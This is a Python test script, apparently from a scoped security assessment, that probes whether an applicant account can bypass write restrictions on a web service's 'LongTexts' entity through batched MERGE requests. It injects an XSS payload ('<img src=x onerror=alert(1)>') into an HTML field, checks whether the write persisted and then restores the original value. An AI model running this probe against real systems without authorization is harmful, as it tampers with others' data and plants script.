#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Track F — F1.4 — Batched LongTexts MERGE re-test.

Sweep 9 saw standalone MERGE /LongTexts(<key>) return 501 uniformly.
Sweep 10 proved that batched dispatch routes to a different handler for
HigherEducations (501 direct -> 204 batched, write landed). This probe
re-tests LongTexts through the batch path.

Payloads on `infoText` (the highest-EV HTML sink from Track D):
  1. `<img src=x onerror=alert(1)>KLXSSPROBE_F14`  (classic XSS)
  2. `KLXSSPROBE_F14_plain`                        (plain marker — did the
                                                    value persist even if the
                                                    XSS payload got stripped?)

Verdicts:
  Inner 501 -> handler dispatches same both paths for LongTexts; Sweep 9
             conclusion holds; the 14 htmlText sinks remain closed.
  Inner 204 + field_changed=True -> CROWN JEWEL: LongTexts writable via
             batch by an applicant. Halt, commit, restore, write up.
  Inner 204 + field_changed=False -> same silent-drop pattern as F1.1;
             clean-negative with signaling quirk.

Budget: baseline read + 2 batch MERGEs + 2 re-reads + up to 2 restore MERGEs
      = 4 non-safe max. Well under the 12 cap.
Cleanup: mandatory in `finally:` for any field_changed=True.
"""
import argparse
import json
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import authz_matrix as m

KEY = "EN|50000050|2020"  # highest-EV key from Sweep 9
ENTITY = f"LongTexts('{KEY}')"
PAYLOADS = [
    ("classic_img_onerror", "<img src=x onerror=alert(1)>KLXSSPROBE_F14"),
    ("plain_marker", "KLXSSPROBE_F14_plain"),
]
TARGET_FIELD = "infoText"


def batched_merge(client, session, body_dict, logger, note):
    body, boundary = m._batch_body(
        [], changeset=[("MERGE", ENTITY, body_dict)])
    r = client.request(session, "POST", "$batch", body=body,
                       extra_headers={"Content-Type":
                                      f"multipart/mixed; boundary={boundary}"},
                       note=note)
    inners = m._parse_batch_inner_statuses(r.get("text", ""))
    inner = inners[0] if inners else None
    logger.log("f1.4", ENTITY, "POST $batch", note, r,
               [f"outer={r.get('status')}", f"inner={inner}",
                f"payload={json.dumps(body_dict)[:120]}"])
    return r.get("status"), inner


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--dry-run", action="store_true")
    ap.add_argument("--min-interval", type=float, default=8.0)
    args = ap.parse_args()
    m.MIN_INTERVAL = args.min_interval
    print(f"[cadence] MIN_INTERVAL={m.MIN_INTERVAL}", file=sys.stderr)

    client = m.Client(dry_run=args.dry_run)
    logger = m.MatrixLogger(m.JSONL_PATH, dry_run=args.dry_run, append=True)

    if args.dry_run:
        sA = m.Session("A", "dry")
        sA.csrf = "<dry>"
    else:
        sA = m.Session("A", m.load_cookie_header(m.CREDS_DIR + "/A.cookies"))
        client.fetch_csrf(sA)

    # ----- Baseline (safe read) --------------------------------------------
    rB = m.read_entity(client, sA, ENTITY, logger, "f1.4", "F1.4 baseline")
    baseline = m.json_field(rB.get("text", ""), TARGET_FIELD)
    logger.log("f1.4", ENTITY, "NOTE", "F1.4 baseline captured",
               {"status": "n/a", "text": ""},
               [f"{TARGET_FIELD}_len={len(baseline) if baseline else 0}",
                f"{TARGET_FIELD}_preview={(baseline or '')[:80]!r}"])

    landed = []  # (payload_name, payload_value) tuples that persisted
    verdicts = []

    try:
        for pname, pval in PAYLOADS:
            note = f"F1.4 batched MERGE {TARGET_FIELD}={pname}"
            outer, inner = batched_merge(client, sA, {TARGET_FIELD: pval},
                                          logger, note)
            rA = m.read_entity(client, sA, ENTITY, logger, "f1.4",
                                f"F1.4 re-read {pname}")
            now = m.json_field(rA.get("text", ""), TARGET_FIELD)
            changed = (now != baseline) and (now == pval)
            flags = [f"outer={outer}", f"inner={inner}",
                     f"baseline_len={len(baseline) if baseline else 0}",
                     f"after_len={len(now) if now else 0}",
                     f"payload_in_after={('KLXSSPROBE_F14' in (now or ''))}",
                     f"field_changed={changed}"]
            if changed:
                flags.append("ANOMALY_longtexts_batched_write_persisted")
                landed.append((pname, pval))
            logger.log("f1.4", ENTITY, "COMPARE", f"F1.4 verdict {pname}",
                        {"status": "n/a", "text": ""}, flags)
            verdicts.append((pname, outer, inner, changed))
            if changed:
                print(f"[HALT] Critical: LongTexts batch write persisted "
                      f"({pname}) — halting for restore + writeup",
                      file=sys.stderr)
                break
    finally:
        # ----- Cleanup — restore any landed payload ----------------------
        if landed:
            # baseline is what we want back; restore via batched MERGE
            outer_r, inner_r = batched_merge(
                client, sA, {TARGET_FIELD: baseline or ""},
                logger, f"F1.4 RESTORE {TARGET_FIELD}")
            rv = m.read_entity(client, sA, ENTITY, logger, "f1.4",
                                "F1.4 verify restore")
            now = m.json_field(rv.get("text", ""), TARGET_FIELD)
            ok = (now == baseline)
            logger.log("f1.4", ENTITY, "CLEANUP_VERIFY",
                        f"{TARGET_FIELD} ok={ok}",
                        {"status": "n/a", "text": ""},
                        [f"cleanup_ok={ok}",
                         f"restore_inner={inner_r}",
                         f"baseline_len={len(baseline) if baseline else 0}",
                         f"now_len={len(now) if now else 0}"])

    # ----- Summary ---------------------------------------------------------
    print("\n=== F1.4 SUMMARY ===", file=sys.stderr)
    any_hit = False
    for pname, outer, inner, changed in verdicts:
        marker = " ⚠ ANOMALY" if changed else ""
        any_hit = any_hit or changed
        print(f"  {pname:<28} outer={outer} inner={inner} "
              f"changed={changed}{marker}", file=sys.stderr)
    print(f"\n[VERDICT] longtexts_batch_write_persisted={any_hit}",
          file=sys.stderr)
    return 0 if not any_hit else 1


if __name__ == "__main__":
    sys.exit(main())
